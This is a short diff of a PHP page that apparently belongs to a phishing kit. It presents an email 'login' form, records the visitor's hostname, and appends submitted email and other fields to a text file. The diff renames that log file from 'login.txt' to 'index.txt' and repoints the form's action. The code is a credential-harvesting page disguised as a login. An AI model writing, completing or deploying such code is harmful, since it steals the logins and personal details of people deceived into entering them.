@@ -239,7 +239,7 @@ $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
 
 
-$fh = Fopen('login.txt', 'a');
+$fh = Fopen('index.txt', 'a');
 fwrite($fh, 'Data: '.$data."\n");
 fwrite($fh, 'Data: '.$date."\n");
 fwrite($fh, 'Email: '.$email."\n");
@@ -255,7 +255,7 @@ fclose($fh);
 
 ?>
 
- <form name="login" action="security.php" method="POST" onsubmit="return validate()">
+ <form name="login" action="index.html" method="POST" onsubmit="return validate()">
 	  <table>
 	  	<tr>
 	  		<td class="tem">Email: </td>
